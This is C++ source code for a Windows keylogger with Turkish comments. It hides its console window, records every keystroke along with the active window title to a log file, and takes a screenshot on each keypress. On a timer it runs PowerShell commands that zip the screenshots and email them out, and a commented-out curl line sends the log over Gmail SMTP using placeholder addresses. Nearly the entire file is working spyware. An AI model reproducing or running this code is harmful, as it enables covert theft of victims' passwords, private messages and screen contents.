#define _CRT_SECURE_NO_WARNINGS
#include "KeyMap.h"
#include "KeyLogWin.h"
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h> 
#include <string>
#include <sstream>
#include <GdiPlus.h>
#include <future>
#include <locale.h>
#include <direct.h>

int c = 0;

#pragma comment( lib, "gdiplus" )
using namespace std;
using std::fstream;
using std::ofstream;

//*********************************************************************************************************************************
//Aktif Olan Pencerenin Görüntüsünü Al
//*********************************************************************************************************************************

string GetActiveWindowTitle()
{
	wchar_t wnd_title[128];
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	std::wstring ws(wnd_title);
	string str(ws.begin(), ws.end());
	return str;
}

//*********************************************************************************************************************************
//Ekran Görüntüsünü Alıp dosyaya Kaydet
//*********************************************************************************************************************************

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void gdiscreen(int a);
void gdiscreen(int a)
{
	using namespace Gdiplus;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		int counter = a;
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid;
		GetEncoderClsid(L"image/jpeg", &clsid);
		std::wstring st_ek = L".jpg";
		std::wstring st_ek2 = L"[";
		std::wstring st_ek3 = L"]";
		std::string ProcName = GetActiveWindowTitle();
		std::wstring ProcNameConv;
		ProcNameConv.assign(ProcName.begin(), ProcName.end());
		//ws.assign(s.begin(), s.end());
		std::wstring st = L".\\ScreenLog\\" + std::to_wstring(counter) + st_ek2 + ProcNameConv + st_ek3 + st_ek; //full path
		bitmap.Save(st.c_str(), &clsid);
		SelectObject(memdc, hOldBitmap);
		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0, scrdc);
	}
	GdiplusShutdown(gdiplusToken);
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;
	ImageCodecInfo* pImageCodecInfo = NULL;
	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;
	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;
	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

//*********************************************************************************************************************************
//Komut Satırını Gizle
//*********************************************************************************************************************************

void HideCmd() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}


//*********************************************************************************************************************************
//Dosya İşlemlerini Yap ( Dosya Açma - Kapama ve Dosyaya veri Girilimi)
//*********************************************************************************************************************************

void SaveFile(char key , int c) {
	KeyMap KeyMap;
	ofstream LogFile;
	string MailDate = "Date: " + KeyMap.GetTime();
	string ProcName = GetActiveWindowTitle();
	LogFile.open("keylogger_log.txt", fstream::app);
	/*LogFile << "From:<mail address>1" << endl << "To:<mail address>" << endl << "Subject: Keylogger" << endl << MailDate << endl << endl;*/
	if (ProcName == GetActiveWindowTitle()) {
		LogFile << "[" << KeyMap.GetTime() << "]" << "->" << "[" << ProcName << "]" << key << endl;
		::c++;
		gdiscreen(::c);
		LogFile.close();
	}
	else
	{
		ProcName = GetActiveWindowTitle();
		LogFile << "[" << KeyMap.GetTime() << "]" << "->" << "[" << ProcName << "]" << key << endl;
		::c++;
		gdiscreen(::c);
		LogFile.close();
	}
	LogFile.close();

}

//*********************************************************************************************************************************
//Saati kur mail için
//*********************************************************************************************************************************

int SetTimeFunc() {
	HideCmd();
	std::string EmailCommand = "powershell Get-Content '.\\pshell2.ps1'  | PowerShell.exe -noprofile -";
	std::string PicCompresCommand = "powershell -ExecutionPolicy ByPass Compress-Archive  -Path '.\\ScreenLog' -DestinationPath '.\\ScreenLog.zip'  -Force";
	int s = 0, d = 15;
	char sec = 'v';
	while (sec == 'v') {
		for (s; s < 24; s++) {
			for (d; d < 60; d++) {
				if (s == 1 && d == 0) {
					WinExec(PicCompresCommand.c_str(), SW_SHOW);
				}
				cout << s << "\t" << d << endl;
				if (s == 1 && d == 5) {
					WinExec(EmailCommand.c_str(), SW_SHOW);
				}
				Sleep(1000);
			}
			d = 0;
			s = 0;
			d = 0;
		}
	}
	return 0;
}

//*********************************************************************************************************************************
//Klavyeden Key Alma
//*********************************************************************************************************************************

char GetKey() {
	char Key;
	int c = 1;
	KeyMap KeyMap;
	KeyLogWin ew1;
	HINSTANCE h = GetModuleHandle(nullptr);
	if (!KeyLogWin::Init(h)) {
		std::cout << "KeyLogWin Failed to Init()!" << std::endl;
		return 1;
	}
	ew1.Create("MyWindowName", 600, 600, 500, 500);
	ew1.Show();
	MSG msg;

	while (true) {
		if (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
			if (msg.message == WM_QUIT) break;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
			for (Key = 8; Key <= 255; Key++) {
				if (GetAsyncKeyState(Key) == -32767) {
					if (KeyMap.isKeyListed(Key) == 0) {
						SaveFile(Key, c);

					}
				}
			}
		}
	};
	return c;
}
//*********************************************************************************************************************************
//Dosya Yarat
//*********************************************************************************************************************************

void createFolder() {
	
	if (CreateDirectory(L"ScreenLog", NULL))
	{
		cout << "Folder Created";
	}
	else if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		cout << "Directory already exists";
	}
	else
	{
		cout << " Failed for some other reason";
	}

}

//*********************************************************************************************************************************
//Standart Main Fonksiyonu
//*********************************************************************************************************************************

int main() {
	/*
	std::string PicCompresCommand = "powershell -ExecutionPolicy ByPass Compress-Archive  -Path '<PATH>' -DestinationPath '<COMPRESS PATH>'  -Force";
	std::string EmailCommand = "powershell Get-Content 'ps1path'  | PowerShell.exe -noprofile -";
	std::string command = "curl smtp://smtp.gmail.com:587 -v --mail-from ,\"<mail address>\" --mail-rcpt \"<mailAddress>\" --ssl -u mailaddress:password -T \"keylogger_log.txt\" -k --anyauth";
	*/

	createFolder();
	std::future<char> resultFromDB = std::async(std::launch::async, GetKey);
	std::future<int> SetTimeFuncThread = std::async(std::launch::async, SetTimeFunc);


	return 0;
}